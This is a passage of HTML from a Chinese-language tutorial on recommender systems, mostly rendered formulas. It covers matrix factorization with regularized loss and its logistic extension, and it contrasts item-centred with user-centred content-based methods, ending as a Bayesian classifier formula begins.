\frac{\lambda}{2}(\sum_{i,k}(X_{i,k})^2+\sum_{j,k}(Y_{j,k})^2) </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.8374em;vertical-align:-1.516em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6679em;"><span style="top:-2.1612em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">Y</span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mop">ar<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">min</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.0749em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.05em;"><span style="top:-1.809em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mclose mtight">)</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.05764em;">E</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.516em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen">[(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:2.8097em;vertical-align:-1.4382em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">λ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mopen">(</span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.05em;"><span style="top:-1.8479em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4382em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:2.4882em;vertical-align:-1.4382em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.05em;"><span style="top:-1.8479em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4382em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p>矩阵<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span>可以在梯度下降优化过程中获得，在此有两件事值得注意。首先，每一步的梯度计算并不需要所有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi></mrow><annotation encoding="application/x-tex">E</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span></span>中的元素，我们可以只考虑它的子集，以便“批量”优化我们的目标函数。其次，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span>中的值不必同时更新，梯度下降算法可以在每一步中对<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span>进行交替优化（如此可认为其中一个矩阵是固定的，而下一次迭代就换一个矩阵进行优化）。</p><p>一旦矩阵被分解，我们就可以使用更少的信息来做出新的推荐：我们可以简单地将用户向量乘以任何物品向量，以估计相应的评分。注意，我们还可以使用用户——用户和物品——物品的办法来表示新的用户和物品：近似。因为最近邻搜索不方便在巨大的稀疏向量上运行，但在较小的密集向量上可以运行，这使得一些近似技术更容易处理。</p><h3 id="矩阵分解的拓展">矩阵分解的拓展</h3><p>最终我们可以更进一步地理解矩阵分解的基本含义。其实，分解的概念可以扩展到更复杂的模型，例如，对更一般的神经网络的“分解”。我们能想到的第一个就是布尔交互（Boolean interaction）。如果我们想重建布尔相互作用，一个简单的点积不太适合。然而，如果我们在这个点积上加上一个logistic函数，我们就会得到一个在[0,1]中取值的模型，这样就能更好地拟合这个问题。在这种情况下，要优化模型的公式是：</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><munder><mo><mi>arg</mi><mo>⁡</mo><mi>min</mi><mo>⁡</mo></mo><mrow><mi>X</mi><mo separator="true">,</mo><mi>Y</mi></mrow></munder><mfrac><mn>1</mn><mn>2</mn></mfrac><munder><mo>∑</mo><mrow><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo><mo>∈</mo><mi>E</mi></mrow></munder><mrow><mo stretchy="false">[</mo><mi>f</mi><mo stretchy="false">(</mo><mo stretchy="false">(</mo><msub><mi>X</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msub><mi>Y</mi><mi>j</mi></msub><msup><mo stretchy="false">)</mo><mi>T</mi></msup><mo stretchy="false">)</mo><mo>−</mo><msub><mi>M</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub><msup><mo stretchy="false">]</mo><mn>2</mn></msup></mrow><mo>+</mo><mfrac><mi>λ</mi><mn>2</mn></mfrac><mo stretchy="false">(</mo><munder><mo>∑</mo><mrow><mi>i</mi><mo separator="true">,</mo><mi>k</mi></mrow></munder><mo stretchy="false">(</mo><msub><mi>X</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>k</mi></mrow></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>+</mo><munder><mo>∑</mo><mrow><mi>j</mi><mo separator="true">,</mo><mi>k</mi></mrow></munder><mo stretchy="false">(</mo><msub><mi>Y</mi><mrow><mi>j</mi><mo separator="true">,</mo><mi>k</mi></mrow></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(X, Y) = \mathop{\arg\min}\limits_{X, Y} \frac{1}{2}\sum_{(i,j)\in E}{[f((X_i)(Y_j)^T)-M_{i,j}]^2} + \frac{\lambda}{2}(\sum_{i,k}(X_{i,k})^2+\sum_{j,k}(Y_{j,k})^2) </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.8374em;vertical-align:-1.516em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6679em;"><span style="top:-2.1612em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">Y</span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mop">ar<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">min</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.0749em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.05em;"><span style="top:-1.809em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mclose mtight">)</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.05764em;">E</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.516em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">((</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:2.8097em;vertical-align:-1.4382em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">λ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mopen">(</span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.05em;"><span style="top:-1.8479em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4382em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:2.4882em;vertical-align:-1.4382em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.05em;"><span style="top:-1.8479em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4382em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p>其中，f()是 logistic 函数，在复杂的推荐系统中，更深层的神经网络模型经常被用来达到最先进的性能。</p><p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nY12kY9YzaaAbeqjlRzSvg@2x.png" alt="Matrix factorization can be generalized with the use of a model on top of users and items embeddings."></p><hr><h2 id="基于内容的方法-2">基于内容的方法</h2><p>在前两节中，我们主要讨论了用户——用户、物品——物品和矩阵分解方法。这些方法只考虑用户——物品交互矩阵，属于协同过滤方法。现在让我们描述基于内容的范例。</p><h3 id="基于内容方法的概念">基于内容方法的概念</h3><p>在基于内容的方法中，推荐问题被转换为分类问题（预测用户是否“喜欢”某个物品）或回归问题（预测用户对某个物品的评分）。在这两种情况下，我们都将设置一个基于用户和/或物品特征的模型，即“基于内容”方法的“内容”。</p><p>如果我们的分类（或回归）是基于用户的特征，那么这种方法是以物品为中心的：建模、优化和计算可以“按物品”完成。为此，我们根据用户的特征建立并学习一个模型，试图回答这个问题：“每个用户喜欢这个商品的概率是多少？”（或“每个用户对这个物品给出的评分是多少？”，表示回归）。与每个商品相关联的模型自然是在与该商品相关的数据上进行训练的，通常情况下，当许多用户与该商品进行交互时，它会导致相当健壮的模型。然而，考虑学习模型的交互来自每个用户，即使这些用户具有相似的特征，他们的偏好也可能不同。这意味着即使这种方法更加健壮，它也可以被认为比以用户为中心的方法更不个性化，或者说更有偏见。</p><p>如果我们处理的是物品特性，那么方法是以用户为中心的：建模、优化和计算可以“由用户”完成。然后，我们根据商品的特征按用户训练一个模型，该模型试图回答这个问题：“这个用户喜欢每件商品的概率是多少？”（或者“这个用户给每件物品的价格是多少？”，表示回归）。然后，我们可以为每个经过数据训练的用户附加一个模型：因此，获得的模型比以物品为中心的模型更个性化，因为它只考虑来自该用户的交互。然而，大多数时候，用户只会与相对较少的物品进行交互，因此，我们获得的模型远不如以物品为中心的模型健壮。</p><p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DSMBC24ZnJNViN7ownzZAA@2x.png" alt="Illustration of the difference between item-centred and user-centred content based methods."></p><p>从实际的角度来看，我们应该强调，大多数时候，向一个新用户询问一些信息是很困难的，因为用户不想回答太多问题，而询问关于一个新物品的大量信息很简单，因为添加它们的人有兴趣填充这些信息，以便将他们的物品推荐给正确的用户。注意到，根据要表达的关系的复杂性，我们构建的模型可以或多或少地复杂，从基本模型（用于分类/回归的逻辑/线性回归）到深度神经网络。最后，让我们提一下基于内容的方法也可以既不以用户为中心，也不以物品为中心：关于用户和物品的信息都可以用于我们的模型，例如，通过堆叠两个特征向量并使它们通过神经网络架构。</p><h3 id="物品中心的贝叶斯分类器">物品中心的贝叶斯分类器</h3><p>让我们首先考虑以物品为中心的分类：对于每个物品，我们希望训练一个贝叶斯分类器，它将用户特征作为输入，并输出“喜欢”或“不喜欢”。因此，为了实现分类任务，我们需要计算</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mfrac><mrow><msub><mi mathvariant="double-struck">P</mi><mrow><mi>i</mi><mi>t</mi><mi>e</mi><mi>m</mi></mrow></msub><mo stretchy="false">(</mo><mi>l</mi><mi>i</mi><mi>k</mi><mi>e</mi><mi mathvariant="normal">∣</mi><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi mathvariant="normal">_</mi><mi>f</mi><mi>e</mi><mi>a</mi><mi>t</mi><mi>u</mi><mi>r</mi><mi>e</mi><mi>s</mi><mo stretchy="false">)</mo></mrow><mrow><msub><mi mathvariant="double-struck">P</mi><mrow><mi>i</mi><mi>t</mi><mi>e</mi><mi>m</mi></mrow></msub><mo stretchy="false">(</mo><mi>d</mi><mi>i</mi><mi>s</mi><mi>l</mi><mi>i</mi><mi>k</mi><mi>e</mi><mi mathvariant="normal">∣</mi><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi mathvariant="normal">_</mi><mi>f</mi><mi>e</mi><mi>a</mi><mi>t</mi><mi>u</mi><mi>r</mi><mi>e</mi><mi>s</mi><mo stretchy="false">)</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\mathbb{P}_{item}(like|user\_features)}{\mathbb{P}_{item}(dislike|user\_features)} </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.446em;vertical-align:-0.996em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span 